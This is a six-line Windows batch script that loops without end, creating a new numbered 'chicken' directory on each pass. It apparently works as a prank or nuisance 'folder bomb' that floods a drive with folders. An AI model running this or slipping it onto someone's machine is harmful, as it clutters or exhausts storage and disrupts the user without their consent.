@echo off
set  counter=0
:top
md %counter%+"chicken"
set /a counter+=1
goto top
